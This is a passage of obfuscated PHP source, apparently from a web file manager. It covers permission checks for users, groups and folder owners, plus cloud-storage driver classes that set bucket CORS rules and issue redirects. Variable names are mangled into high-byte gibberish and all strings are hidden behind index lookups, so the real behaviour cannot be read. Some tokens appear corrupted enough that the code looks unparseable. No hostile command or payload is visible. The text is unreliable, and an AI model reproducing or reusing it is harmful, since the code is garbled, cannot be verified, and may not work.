$Ã­æìˆş[2088]); } $­ÔÖç¹ú = $this->field($Ã­æìˆş[2191])->where($öàÛ¥‡‡)->select(); $´í–ª = array(); $¡ú¼³ÔÀ = array_to_keyvalue_group($­ÔÖç¹ú, $Ã­æìˆş[193]); foreach ($¡ú¼³ÔÀ as $æÎıôï => $‘÷ŞÂŸ‘) { $›‘š¿Áë = $this->authArrayCheck($‘÷ŞÂŸ‘, $İßœ); if ($›‘š¿Áë[$Ã­æìˆş[490]] > 0) { $´í–ª[] = $æÎıôï . $Ã­æìˆş[12]; } } if ($â©ıô¦è) { $¤ê’øÅ = Model($Ã­æìˆş[587]); foreach ($â©ıô¦è as $™İÅŸı‘) { $·ëà¢À” = $¤ê’øÅ->getInfo($™İÅŸı‘); if (!$·ëà¢À” || !is_array($·ëà¢À”[$Ã­æìˆş[90]])) { continue; } $´í–ª[] = $·ëà¢À”[$Ã­æìˆş[90]][$Ã­æìˆş[193]]; } } $ëì±“®š = array(); $êë¯±¤ê = $â©ıô¦è; $¯‹š—¶ª = Model($Ã­æìˆş[1432]); $¤ê’øÅ = Model($Ã­æìˆş[587]); $îş³Á”‚ = array(); $²æ¸¦Î‡ = array(); $®§íÀßş = array(); $ï»ˆ–Ó = array(); if ($´í–ª) { $äÌ‚œ¡Ğ = $¯‹š—¶ª->where(array($Ã­æìˆş[193] => array($Ã­æìˆş[494], $´í–ª)))->select(); foreach ($äÌ‚œ¡Ğ as $£ëÅ¹Üæ) { if ($£ëÅ¹Üæ[$Ã­æìˆş[507]] == $Ã­æìˆş[91]) { continue; } $Í•çú÷ = $¯‹š—¶ª->parentLevelArray($£ëÅ¹Üæ[$Ã­æìˆş[586]]); $ëì±“®š = array_merge($ëì±“®š, $Í•çú÷); $êë¯±¤ê[] = $£ëÅ¹Üæ[$Ã­æìˆş[571]]; $îş³Á”‚[$£ëÅ¹Üæ[$Ã­æìˆş[193]]] = $Í•çú÷; $²æ¸¦Î‡[$£ëÅ¹Üæ[$Ã­æìˆş[193]]] = $£ëÅ¹Üæ[$Ã­æìˆş[571]]; } } $êë¯±¤ê = array_values(array_unique($êë¯±¤ê)); $œà›ŒÓ€ = $êë¯±¤ê; foreach ($œà›ŒÓ€ as $™İÅŸı‘) { $·ëà¢À” = $¤ê’øÅ->getInfo($™İÅŸı‘); $Í•çú÷ = $¯‹š—¶ª->parentLevelArray($·ëà¢À”[$Ã­æìˆş[586]]); $êë¯±¤ê = array_merge($êë¯±¤ê, $Í•çú÷); } $êë¯±¤ê = array_values(array_unique($êë¯±¤ê)); foreach ($êë¯±¤ê as $™İÅŸı‘) { $·ëà¢À” = $¤ê’øÅ->getInfo($™İÅŸı‘); $ëì±“®š[] = $·ëà¢À”[$Ã­æìˆş[90]][$Ã­æìˆş[193]]; $®§íÀßş[$™İÅŸı‘] = $·ëà¢À”[$Ã­æìˆş[90]][$Ã­æìˆş[193]]; $ï»ˆ–Ó[$™İÅŸı‘] = $¯‹š—¶ª->parentLevelArray($·ëà¢À”[$Ã­æìˆş[586]]); } foreach ($îş³Á”‚ as $ÛğŒÜ»Ñ => $Óñ¶à«) { $•İş„æ¾ = $²æ¸¦Î‡[$ÛğŒÜ»Ñ]; if (!$•İş„æ¾ || !$®§íÀßş[$•İş„æ¾]) { continue; } $§ŒİŞ¢³ = array(); foreach ($ï»ˆ–Ó[$•İş„æ¾] as $™İÅŸı‘) { $§ŒİŞ¢³[] = $®§íÀßş[$™İÅŸı‘]; } $îş³Á”‚[$ÛğŒÜ»Ñ] = array_merge($§ŒİŞ¢³, $Óñ¶à«); } $ëì±“®š = array_values(array_unique($ëì±“®š)); $¤÷Ñ­ø– = array($Ã­æìˆş[2183] => $ëì±“®š, $Ã­æìˆş[2184] => $îş³Á”‚); $œ¢¹ô¿Ì[$İßœ] = $¤÷Ñ­ø–; return $¤÷Ñ­ø–; } private function makeSourceAuth($ÈêÈşÊÛ, $’‡†£ù–, $Š­ª€´… = false) { $Ğ¾¶ãÒ‘ =& $_SERVER[¡¬ıÜ ƒ]; $ìà¿øÜô = $Ğ¾¶ãÒ‘[91]; $ä·àğ²ò = $ÈêÈşÊÛ[$Ğ¾¶ãÒ‘[571]]; $ô›¼¦ŠÇ = $ÈêÈşÊÛ[$Ğ¾¶ãÒ‘[190]] == SourceModel::TYPE_GROUP; $À¡î ÃÈ = $ô›¼¦ŠÇ ? $this->groupRootAuth($ä·àğ²ò, $Š­ª€´…) : !1; if ($À¡î ÃÈ && Model($Ğ¾¶ãÒ‘[573])->authCheckAction($À¡î ÃÈ[$Ğ¾¶ãÒ‘[489]], $Ğ¾¶ãÒ‘[2007])) { return $this->groupAuthInfo($À¡î ÃÈ, $ä·àğ²ò); } $À¶µğ†— = Model($Ğ¾¶ãÒ‘[1432])->parentLevelArray($ÈêÈşÊÛ[$Ğ¾¶ãÒ‘[586]]); $À¶µğ†— = array_merge(array($ÈêÈşÊÛ[$Ğ¾¶ãÒ‘[193]]), array_reverse($À¶µğ†—)); $˜Æë†şÆ = !1; foreach ($À¶µğ†— as $èø½Ü€ş) { if (!isset($’‡†£ù–[$èø½Ü€ş])) { continue; } $¾Û›äÙÈ = $this->authMake($’‡†£ù–[$èø½Ü€ş], $Š­ª€´…); if ($¾Û›äÙÈ[$Ğ¾¶ãÒ‘[542]]) { $˜Æë†şÆ = $¾Û›äÙÈ; break; } } if (!$ô›¼¦ŠÇ) { return $˜Æë†şÆ; } if (!$˜Æë†şÆ && $À¡î ÃÈ) { $˜Æë†şÆ = $this->groupAuthInfo($À¡î ÃÈ, $ä·àğ²ò); } if (!$˜Æë†şÆ) { $ğ“£¨ºº = Model($Ğ¾¶ãÒ‘[587])->getInfo($ä·àğ²ò); $°†ÆÌ¨ë = explode($Ğ¾¶ãÒ‘[50], trim($ğ“£¨ºº[$Ğ¾¶ãÒ‘[586]], $Ğ¾¶ãÒ‘[50])); $°†ÆÌ¨ë = array_reverse($°†ÆÌ¨ë); foreach ($°†ÆÌ¨ë as $Õı†ƒÉ) { if ($Õı†ƒÉ == $Ğ¾¶ãÒ‘[230] || $Õı†ƒÉ == $ìà¿øÜô) { continue; } $¡«ÊÁØ¢ = $this->groupRootAuth($Õı†ƒÉ, $Š­ª€´…); if (!$¡«ÊÁØ¢) { continue; } $˜Æë†şÆ = $this->groupAuthInfo($¡«ÊÁØ¢, $Õı†ƒÉ); break; } } if (!$˜Æë†şÆ || $˜Æë†şÆ[$Ğ¾¶ãÒ‘[490]] <= 0) { $ÂŠ´á¦“ = $this->authDeepCheck($ÈêÈşÊÛ[$Ğ¾¶ãÒ‘[193]], $Š­ª€´…); if ($ÂŠ´á¦“) { $˜Æë†şÆ = $ÂŠ´á¦“; } } return $˜Æë†şÆ; } private function userIsRoot($èã¶¢© = false) { $‰û–¤İ© =& $_SERVER[¡¬ıÜ ƒ]; if (!$èã¶¢© && KodUser::isRoot()) { return !0; } $“²„’ù = Model($‰û–¤İ©[599])->getInfo($èã¶¢©); $‰™Î³‹ = Model($‰û–¤İ©[2192])->listData($“²„’ù[$‰û–¤İ©[2193]]); if ($‰™Î³‹ && $‰™Î³‹[$‰û–¤İ©[577]][$‰û–¤İ©[2194]] == 1) { return !0; } return !1; } private function sourceAuthInfo($…í’Ì´Ï) { $«Â¢ÒªÛ =& $_SERVER[¡¬ıÜ ƒ]; $ßŠÎğ¬ = Model($«Â¢ÒªÛ[1432]); $ª÷Û¡§® = $ßŠÎğ¬->sourceInfo($…í’Ì´Ï); if (!$ª÷Û¡§®) { return !1; } $ßŠÎğ¬->groupPathDisplay($ª÷Û¡§®); $å—ÜÒÇ = array($ª÷Û¡§®); $å—ÜÒÇ = $ßŠÎğ¬->_listAppendPath($å—ÜÒÇ); $ª÷Û¡§® = $å—ÜÒÇ[0]; $÷”ƒíƒ… = $ª÷Û¡§®[$«Â¢ÒªÛ[584]]; if (isset($ª÷Û¡§®[$«Â¢ÒªÛ[592]])) { $†˜û„¶ = explode($«Â¢ÒªÛ[8], trim($ª÷Û¡§®[$«Â¢ÒªÛ[584]], $«Â¢ÒªÛ[8])); array_shift($†˜û„¶); $÷”ƒíƒ… = $ª÷Û¡§®[$«Â¢ÒªÛ[590]] . $«Â¢ÒªÛ[2195] . implode($«Â¢ÒªÛ[8], $†˜û„¶); } return array($«Â¢ÒªÛ[496] => $ª÷Û¡§®[$«Â¢ÒªÛ[32]], $«Â¢ÒªÛ[87] => KodIO::make($ª÷Û¡§®[$«Â¢ÒªÛ[193]]), $«Â¢ÒªÛ[2196] => $÷”ƒíƒ…); } private function groupAuthInfo($ı›¯šŞ•, $ÆôÅ’Ãí) { $ŒŒáç® =& $_SERVER[¡¬ıÜ ƒ]; $óò¡â× = Model($ŒŒáç®[587])->getInfo($ÆôÅ’Ãí); return array($ŒŒáç®[2197] => intval($ı›¯šŞ•[$ŒŒáç®[489]]), $ŒŒáç®[2180] => $ı›¯šŞ•, $ŒŒáç®[2198] => LNG($ŒŒáç®[2199]), $ŒŒáç®[2189] => array($ŒŒáç®[496] => $óò¡â×[$ŒŒáç®[32]], $ŒŒáç®[87] => KodIO::make($óò¡â×[$ŒŒáç®[90]][$ŒŒáç®[193]]), $ŒŒáç®[2196] => $óò¡â×[$ŒŒáç®[591]])); } protected function groupRootAuth($çöôııÊ, $Ü«™Ñ¡Ò = false) { $Ó´±í¾Ç =& $_SERVER[¡¬ıÜ ƒ]; $Ü«™Ñ¡Ò = $Ü«™Ñ¡Ò ? $Ü«™Ñ¡Ò : USER_ID; $çò°”˜Õ = $Ü«™Ñ¡Ò . $Ó´±í¾Ç[2200] . $çöôııÊ; static $ËÌ÷Šõ = array(); if (isset($ËÌ÷Šõ[$çò°”˜Õ])) { return $ËÌ÷Šõ[$çò°”˜Õ]; } $ìûê×‚ = Model($Ó´±í¾Ç[587])->getInfo($çöôııÊ); $•«¤Éæö = $this->userGroupList($Ü«™Ñ¡Ò); $ÌËİËŒí = isset($•«¤Éæö[$çöôııÊ]) ? $•«¤Éæö[$çöôııÊ][$Ó´±í¾Ç[489]] : !1; if ($ÌËİËŒí && Model($Ó´±í¾Ç[573])->authCheckAction($ÌËİËŒí[$Ó´±í¾Ç[489]], $Ó´±í¾Ç[2007])) { $ËÌ÷Šõ[$çò°”˜Õ] = $ÌËİËŒí; return $ÌËİËŒí; } $…õõºÆæ = $this->sourceAuthSelect($ìûê×‚[$Ó´±í¾Ç[90]][$Ó´±í¾Ç[193]]); $¢‘½øèŠ = $…õõºÆæ ? $this->authMake($…õõºÆæ, $Ü«™Ñ¡Ò) : !1; $¨Å’ğÔ = $¢‘½øèŠ ? $¢‘½øèŠ[$Ó´±í¾Ç[542]] : !1; $ËÌ÷Šõ[$çò°”˜Õ] = $¨Å’ğÔ ? $¨Å’ğÔ : $ÌËİËŒí; return $ËÌ÷Šõ[$çò°”˜Õ]; } public function authOwnerApply($Õ’‚ìÆ¤) { $¯²ÛíÄ‹ =& $_SERVER[¡¬ıÜ ƒ]; if (empty($Õ’‚ìÆ¤[$¯²ÛíÄ‹[489]]) || isset($Õ’‚ìÆ¤[$¯²ÛíÄ‹[2201]]) && $Õ’‚ìÆ¤[$¯²ÛíÄ‹[2201]]) { return $Õ’‚ìÆ¤; } if (AuthModel::authCheckRoot($Õ’‚ìÆ¤[$¯²ÛíÄ‹[489]][$¯²ÛíÄ‹[490]])) { return $Õ’‚ìÆ¤; } $ÑÒëŠòß = Model($¯²ÛíÄ‹[1432])->parentLevelArray($Õ’‚ìÆ¤[$¯²ÛíÄ‹[586]]); $ÑÒëŠòß = array_merge(array($Õ’‚ìÆ¤[$¯²ÛíÄ‹[193]]), array_reverse($ÑÒëŠòß)); $ñùÏş¡¨ = $this->sourceAuthSelect($ÑÒëŠòß); $ş×â„ñé = array(); $Œøà´ğğ = array(); foreach ($ñùÏş¡¨ as $İåèà·¡ => $­Ë¤—Û“) { $–ÛÂï©Ì = $this->authFolderOwnerUser($­Ë¤—Û“); $ş×â„ñé[$İåèà·¡] = $–ÛÂï©Ì; $Œøà´ğğ = array_merge($Œøà´ğğ, $–ÛÂï©Ì[$¯²ÛíÄ‹[667]]); if ($–ÛÂï©Ì[$¯²ÛíÄ‹[2202]]) { break; } } if (count($Œøà´ğğ) == 0) { $Œøà´ğğ = $this->authFolderOwnerGroup($Õ’‚ìÆ¤[$¯²ÛíÄ‹[571]]); } $Œøà´ğğ = array_unique($Œøà´ğğ); if (AuthModel::authCheckRoot($Õ’‚ìÆ¤[$¯²ÛíÄ‹[489]][$¯²ÛíÄ‹[490]])) { $Œøà´ğğ[] = USER_ID; } $Õ’‚ìÆ¤[$¯²ÛíÄ‹[489]][$¯²ÛíÄ‹[2203]] = Model($¯²ÛíÄ‹[579])->userListInfo($Œøà´ğğ); return $Õ’‚ìÆ¤; } private function authFolderOwnerGroup($¬ç›Âè„) { $ªŒàëì› =& $_SERVER[¡¬ıÜ ƒ]; $áäìÏÃ´ = Model($ªŒàëì›[2080])->where(array($ªŒàëì›[1986] => $¬ç›Âè„))->select(); $€å†õ¶é = array(); if (!$áäìÏÃ´) { return $€å†õ¶é; } foreach ($áäìÏÃ´ as $¯È¿¬Ë) { $öØã•ª’ = $this->authInfo($¯È¿¬Ë); if (AuthModel::authCheckRoot($öØã•ª’[$ªŒàëì›[489]])) { $€å†õ¶é[] = $¯È¿¬Ë[$ªŒàëì›[1785]]; } } return $€å†õ¶é; } private function authFolderOwnerUser($Òš·±ˆ) { $í«±Ë“× =& $_SERVER[¡¬ıÜ ƒ]; $©àÃ§… = array(); $¦ÌŠŞ¼ü = !1; foreach ($Òš·±ˆ as $¡ïİöÚ) { $‰œœöù¬ = $this->authInfo($¡ïİöÚ); if ($¡ïİöÚ[$í«±Ë“×[571]] == $í«±Ë“×[230]) { $¦ÌŠŞ¼ü = !0; } if ($¡ïİöÚ[$í«±Ë“×[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($‰œœöù¬[$í«±Ë“×[489]])) { $©àÃ§…[] = $¡ïİöÚ[$í«±Ë“×[571]]; } } } return array($í«±Ë“×[667] => $©àÃ§…, $í«±Ë“×[2202] => $¦ÌŠŞ¼ü); } public function authMake($¹×í¸â°, $Éå’Î¥º = false) { $›ì÷¢ò¥ =& $_SERVER[¡¬ıÜ ƒ]; $¯ñ¹ÚŞí = $this->authArrayCheck($¹×í¸â°, $Éå’Î¥º); if ($¯ñ¹ÚŞí[$›ì÷¢ò¥[2204]]) { $¯ñ¹ÚŞí[$›ì÷¢ò¥[2204]] = $this->sourceAuthInfo($¯ñ¹ÚŞí[$›ì÷¢ò¥[2204]]); } return $¯ñ¹ÚŞí; } public function authArrayCheck($—‹ØºŒö, $‘Ï’íáÕ = false) { $«­í›³× =& $_SERVER[¡¬ıÜ ƒ]; if (!$—‹ØºŒö) { return array($«­í›³×[490] => 0, $«­í›³×[542] => !1); } $‘Ï’íáÕ = $‘Ï’íáÕ ? $‘Ï’íáÕ : USER_ID; $Ø”Îıò¹ = 0; $ÓĞğÆ›¤ = 0; $¤™¸æÑ§ = 0; $´Ø¦›íÓ = 0; $¹¾ƒİë  = 0; $•™¹ıÔ = 0; $»€¶Êü = 1000; $„òîã = 0; $€‹µæŸ¸ = 0; $ÓÄŞá = 0; $Ëú¨µ¹ç = 0; $š…Ëæş = array($«­í›³×[193] => 0); foreach ($—‹ØºŒö as $š…Ëæş) { $ÄÆ«‘»Ğ = $this->authInfo($š…Ëæş); if (!$ÄÆ«‘»Ğ) { continue; } $ÒöÌ‡İ = $š…Ëæş[$«­í›³×[571]]; $—áÌı«ò = intval($ÄÆ«‘»Ğ[$«­í›³×[489]]); if ($š…Ëæş[$«­í›³×[190]] == SourceModel::TYPE_USER && $ÒöÌ‡İ == $‘Ï’íáÕ) { $Ø”Îıò¹ = !0; $¤™¸æÑ§ = $ÄÆ«‘»Ğ; $ÓĞğÆ›¤ = $—áÌı«ò; } else { if ($š…Ëæş[$«­í›³×[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ÒöÌ‡İ, $‘Ï’íáÕ)) { $´Ø¦›íÓ = !0; $Ú…¶Æß´ = $this->groupStepToUserGroup($ÒöÌ‡İ, $‘Ï’íáÕ); if ($Ú…¶Æß´ < $»€¶Êü) { $»€¶Êü = $Ú…¶Æß´; $¹¾ƒİë  = $—áÌı«ò; $•™¹ıÔ = $ÄÆ«‘»Ğ; $„òîã = $ÒöÌ‡İ; } if ($Ú…¶Æß´ == $»€¶Êü && $—áÌı«ò >= $¹¾ƒİë ) { $¹¾ƒİë  = $—áÌı«ò; $•™¹ıÔ = $ÄÆ«‘»Ğ; $„òîã = $ÒöÌ‡İ; } } else { if ($ÒöÌ‡İ == $«­í›³×[230]) { $€‹µæŸ¸ = !0; $Ëú¨µ¹ç = $ÄÆ«‘»Ğ; $ÓÄŞá = $—áÌı«ò; } } } } if ($Ø”Îıò¹) { $ƒèÃ¡÷ö = $ÓĞğÆ›¤; $ÄÆ«‘»Ğ = $¤™¸æÑ§; $–ËÉÂ¯• = LNG($«­í›³×[2205]); } else { if ($´Ø¦›íÓ) { $ƒèÃ¡÷ö = $¹¾ƒİë ; $ÄÆ«‘»Ğ = $•™¹ıÔ; $¥‹Òè¿• = Model($«­í›³×[587])->getInfo($„òîã); $–ËÉÂ¯• = $«­í›³×[176] . $¥‹Òè¿•[$«­í›³×[591]] . $«­í›³×[2206] . LNG($«­í›³×[2207]); } else { if ($€‹µæŸ¸) { $ƒèÃ¡÷ö = $ÓÄŞá; $ÄÆ«‘»Ğ = $Ëú¨µ¹ç; $–ËÉÂ¯• = LNG($«­í›³×[2177]); } else { $ƒèÃ¡÷ö = 0; $ÄÆ«‘»Ğ = !1; $–ËÉÂ¯• = $«­í›³×[12]; } } } $ã…‹½ôÉ = array($«­í›³×[2197] => intval($ƒèÃ¡÷ö), $«­í›³×[2180] => $ÄÆ«‘»Ğ, $«­í›³×[2198] => $–ËÉÂ¯•, $«­í›³×[2189] => $š…Ëæş[$«­í›³×[193]]); return $ã…‹½ôÉ; } private function groupContainUser($¶íºğ´á, $•‘°ãúõ = false) { return in_array($¶íºğ´á, $this->userGroupParents($•‘°ãúõ)); } private function groupStepToUserGroup($ˆ½À…, $¢ãŠ÷Æ = false) { $´èÅ¾Òí =& $_SERVER[¡¬ıÜ ƒ]; $ÃØ¶î§ë = $this->userGroupList($¢ãŠ÷Æ); $øÓËış² = 1000; $ßûó‹À³ = $GLOBALS[$´èÅ¾Òí[6]][$´èÅ¾Òí[92]][$´èÅ¾Òí[2093]] == 1; $àËÈâÒ = $ßûó‹À³ ? 3 : 2; foreach ($ÃØ¶î§ë as $ÈéÈÖÎ¼) { if ($ÈéÈÖÎ¼[$´èÅ¾Òí[1986]] == $ˆ½À…) { return 0; } $¹±—ÌÆ¶ = explode($´èÅ¾Òí[50], trim($ÈéÈÖÎ¼[$´èÅ¾Òí[586]], $´èÅ¾Òí[50])); if ($¹±—ÌÆ¶[0] == $´èÅ¾Òí[230] && count($¹±—ÌÆ¶) > $àËÈâÒ) { $óü”­Ã— = array_reverse(array_slice($¹±—ÌÆ¶, $àËÈâÒ)); $º¶˜’Öà = array_search($ˆ½À…, $óü”­Ã—); if ($º¶˜’Öà !== !1 && $º¶˜’Öà + 1 <= $øÓËış²) { $øÓËış² = $º¶˜’Öà + 1; } } } return $øÓËış²; } private function userGroupList($ÉğÚ³ø’ = false) { $–¦˜Şµ¿ =& $_SERVER[¡¬ıÜ ƒ]; static $ÔœüÖÉï = array(); if (isset($ÔœüÖÉï[$ÉğÚ³ø’])) { return $ÔœüÖÉï[$ÉğÚ³ø’]; } $äŸ…æ¤· = Model($–¦˜Şµ¿[599])->getInfo($ÉğÚ³ø’); $ÔœüÖÉï[$ÉğÚ³ø’] = array_to_keyvalue($äŸ…æ¤·[$–¦˜Şµ¿[2178]], $–¦˜Şµ¿[1986]); return $ÔœüÖÉï[$ÉğÚ³ø’]; } public function userGroupParents($â—ÃèÏò) { $³Ÿ½¤á =& $_SERVER[¡¬ıÜ ƒ]; static $àî¥¨Œî = array(); $â—ÃèÏò = $â—ÃèÏò ? $â—ÃèÏò : USER_ID; if (isset($àî¥¨Œî[$â—ÃèÏò])) { return $àî¥¨Œî[$â—ÃèÏò]; } $¦Ç½Şá = $this->userGroupList($â—ÃèÏò); $êÌï»æ = array(); $¢¼¯ªÑ’ = $GLOBALS[$³Ÿ½¤á[6]][$³Ÿ½¤á[92]][$³Ÿ½¤á[2093]] == 1; $¦™ììõÙ = $¢¼¯ªÑ’ ? 3 : 2; foreach ($¦Ç½Şá as $§¹—‘ğÌ) { $¶Ğô§â™ = array($§¹—‘ğÌ[$³Ÿ½¤á[1986]]); $”±ğ°ğ‰ = explode($³Ÿ½¤á[50], trim($§¹—‘ğÌ[$³Ÿ½¤á[586]], $³Ÿ½¤á[50])); if ($”±ğ°ğ‰[0] == $³Ÿ½¤á[230] && count($”±ğ°ğ‰) > $¦™ììõÙ) { $äÁÓˆÅ¡ = array_slice($”±ğ°ğ‰, $¦™ììõÙ); $¶Ğô§â™ = array_merge($¶Ğô§â™, array_reverse($äÁÓˆÅ¡)); } $êÌï»æ = array_merge($êÌï»æ, $¶Ğô§â™); } $àî¥¨Œî[$â—ÃèÏò] = array_unique($êÌï»æ); return $àî¥¨Œî[$â—ÃèÏò]; } public function authTargetInfoMake($ªé¿Êïš) { $í øÇÎë =& $_SERVER[¡¬ıÜ ƒ]; $Ê„Ç¹à = array(); $Ñ ÅûÁ« = array(); foreach ($ªé¿Êïš as $Ñëôô„) { if ($Ñëôô„[$í øÇÎë[190]] == SourceModel::TYPE_USER) { $Ê„Ç¹à[] = intval($Ñëôô„[$í øÇÎë[571]]); } else { if ($Ñëôô„[$í øÇÎë[190]] == SourceModel::TYPE_GROUP) { $Ñ ÅûÁ«[] = intval($Ñëôô„[$í øÇÎë[571]]); } } } if ($Ê„Ç¹à) { $Ê„Ç¹à = Model($í øÇÎë[579])->userListInfo($Ê„Ç¹à); } if ($Ñ ÅûÁ«) { $©ò²ôŒ = array($í øÇÎë[2078] => array($í øÇÎë[494], $Ñ ÅûÁ«)); $Ñ ÅûÁ« = Model($í øÇÎë[587])->field($í øÇÎë[2208])->where($©ò²ôŒ)->select(); $Ñ ÅûÁ« = array_to_keyvalue($Ñ ÅûÁ«, $í øÇÎë[1986]); } return array($í øÇÎë[2209] => $Ê„Ç¹à, $í øÇÎë[2210] => $Ñ ÅûÁ«); } public function authInfo($‡÷×ŠÅß) { $‡Ñë“ÑÈ =& $_SERVER[¡¬ıÜ ƒ]; if ($‡÷×ŠÅß[$‡Ñë“ÑÈ[2094]]) { $ÊæçÖ ä = Model($‡Ñë“ÑÈ[573])->listData($‡÷×ŠÅß[$‡Ñë“ÑÈ[2094]]); if (!$ÊæçÖ ä) { return !1; $ïåŒ‡†´ = Model($‡Ñë“ÑÈ[573])->listData(); $íƒ…Áïø = array_filter_by_field($ïåŒ‡†´, $‡Ñë“ÑÈ[489], $‡Ñë“ÑÈ[230]); return $íƒ…Áïø; } $ìß¥ü‘Û = array_field_key($ÊæçÖ ä, array($‡Ñë“ÑÈ[477], $‡Ñë“ÑÈ[32], $‡Ñë“ÑÈ[489], $‡Ñë“ÑÈ[2009], $‡Ñë“ÑÈ[2010])); $ìß¥ü‘Û[$‡Ñë“ÑÈ[2211]] = $‡÷×ŠÅß; return $ìß¥ü‘Û; } else { return array($‡Ñë“ÑÈ[495] => 0, $‡Ñë“ÑÈ[1992] => $‡÷×ŠÅß[$‡Ñë“ÑÈ[2155]], $‡Ñë“ÑÈ[496] => $‡Ñë“ÑÈ[12], $‡Ñë“ÑÈ[2009] => $‡Ñë“ÑÈ[2212]); } } } goto dÄ‰æºÃŒÈ; f¨“›šÂª: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($è‡­ª¤ı) { parent::__construct($è‡­ª¤ı); $this->setSignVersion($_SERVER[¡¬ıÜ ƒ][249]); } public function fileOutImage($™Ó¨²ÅŠ, $ÆÃµ€»¿ = 250) { $´†…œ¯µ =& $_SERVER[¡¬ıÜ ƒ]; if ($this->size($™Ó¨²ÅŠ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($™Ó¨²ÅŠ, $ÆÃµ€»¿); } $†š¶ïø” = array($´†…œ¯µ[1471] => $´†…œ¯µ[1472] . $ÆÃµ€»¿ . $´†…œ¯µ[1473]); $ØíĞ—•ƒ = $this->link($™Ó¨²ÅŠ, $†š¶ïø”); $this->fileOutLink($ØíĞ—•ƒ); } public function fileOutLink($ªê±Á) { $½çÃõà =& $_SERVER[¡¬ıÜ ƒ]; if (substr($ªê±Á, 0, 7) == $½çÃõà[218]) { $ªê±Á = $½çÃõà[219] . substr($ªê±Á, 7); } header($½çÃõà[175] . $ªê±Á); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($§‹ÊÑïß) { parent::__construct($§‹ÊÑïß); $this->setSignVersion($_SERVER[¡¬ıÜ ƒ][249]); } public function fileOutLink($¸ûÁ±á) { $´ÒŒñÇ¢ =& $_SERVER[¡¬ıÜ ƒ]; if (substr($¸ûÁ±á, 0, 7) == $´ÒŒñÇ¢[218]) { $¸ûÁ±á = $´ÒŒñÇ¢[219] . substr($¸ûÁ±á, 7); } header($´ÒŒñÇ¢[175] . $¸ûÁ±á); die; } public function uploadFormData($¸Ö…¶ë, $õÃñÚŠ· = 3600) { return $this->uploadFormDataV2($¸Ö…¶ë, $õÃñÚŠ·); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($×ËÙÎß¬) { parent::__construct(); include_once SDK_DIR . $_SERVER[¡¬ıÜ ƒ][1474]; $this->_init($×ËÙÎß¬); } public function _init($¶Ÿ‘³£Ù) { $’âØî‚± =& $_SERVER[¡¬ıÜ ƒ]; $this->config = $¶Ÿ‘³£Ù; foreach ($¶Ÿ‘³£Ù as $«¸×¸½¨ => $°È¼œóÃ) { if (isset($this->{$«¸×¸½¨})) { $this->{$«¸×¸½¨} = $°È¼œóÃ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($’âØî‚±[1475] . LNG($’âØî‚±[1476])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $“³ Œ±§ =& $_SERVER[¡¬ıÜ ƒ]; $º—„©çÍ = new OSS\Model\CorsConfig(); $·ñõ¹‹À = new OSS\Model\CorsRule(); $·ñõ¹‹À->addAllowedOrigin($“³ Œ±§[1477]); $·ñõ¹‹À->addAllowedMethod($“³ Œ±§[1478]); $·ñõ¹‹À->addAllowedMethod($“³ Œ±§[1479]); $·ñõ¹‹À->addAllowedMethod($“³ Œ±§[1480]); $·ñõ¹‹À->addAllowedMethod($“³ Œ±§[1481]); $·ñõ¹‹À->addAllowedMethod($“³ Œ±§[165]); $·ñõ¹‹À->setMaxAgeSeconds(600); $·ñõ¹‹À->addExposeHeader($“³ Œ±§[1482]); $·ñõ¹‹À->addAllowedHeader($“³ Œ±§[1477]); $º—„©çÍ->addRule($·ñõ¹‹À); try { $this->client->putBucketCors($this->bucket, $º—„©çÍ); } catch (OSS\Core\OssException $‰ó‡¶ı) { $this->writeLog(__FUNCTION__ . $“³ Œ±§[214] . $‰ó‡¶ı->getMessage()); return !1; } return !0; } public function getBucketCors() { $ÁÛ™ÏÚ =& $_SERVER[¡¬ıÜ ƒ]; $Š¸‰ò = null; try { $Š¸‰ò = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $øøğÚûç) { $this->writeLog(__FUNCTION__ . $ÁÛ™ÏÚ[214] . $øøğÚûç->getMessage()); return null; } if (!$Š¸‰ò || !($İ¾ùıÉ› = $Š¸‰ò->getRules())) { return null; } $ø«ÜÖ¢Ï = $İ¾ùıÉ›[0]->getAllowedOrigins(); $×ãâ¶ = $İ¾ùıÉ›[0]->getAllowedMethods(); $‡¢õØÊ± = $İ¾ùıÉ›[0]->getMaxAgeSeconds(); $ûÊ…ÓŒõ = $İ¾ùıÉ›[0]->getExposeHeaders(); $ñÏ“¹‚ = $İ¾ùıÉ›[0]->getAllowedHeaders(); return array($ÁÛ™ÏÚ[220] => isset($ø«ÜÖ¢Ï[0]) ? $ø«ÜÖ¢Ï[0] : $ÁÛ™ÏÚ[12], $ÁÛ™ÏÚ[224] => $×ãâ¶, $ÁÛ™ÏÚ[1483] => $‡¢õØÊ±, $ÁÛ™ÏÚ[1484] => isset($ûÊ…ÓŒõ[0]) ? $ûÊ…ÓŒõ[0] : $ÁÛ™ÏÚ[12], $ÁÛ™ÏÚ[221] => isset($ñÏ“¹‚[0]) ? $ñÏ“¹‚[0] : $ÁÛ™ÏÚ[12]); } public function isBucketCors() { $êµ¯æ‰— =& $_SERVER[¡¬ıÜ ƒ]; $ÅœÜ¶î¾ = $this->getBucketCors(); if (!$ÅœÜ¶î¾ || !is_array($ÅœÜ¶î¾)) { return !1; } if ($ÅœÜ¶î¾[$êµ¯æ‰—[220]] != $êµ¯æ‰—[222] || $ÅœÜ¶î¾[$êµ¯æ‰—[221]] != $êµ¯æ‰—[222]) { return !1; } $¹¨¥ôçÙ = array_map($êµ¯æ‰—[223], $ÅœÜ¶î¾[$êµ¯æ‰—[224]]); if (!is_array($¹¨¥ôçÙ)) { $¹¨¥ôçÙ = array(); } $Í›ÀëÇº = array($êµ¯æ‰—[225], $êµ¯æ‰—[226], $êµ¯æ‰—[227], $êµ¯æ‰—[228], $êµ¯æ‰—[229]); $„ı¤À¢Î = array_diff($Í›ÀëÇº, 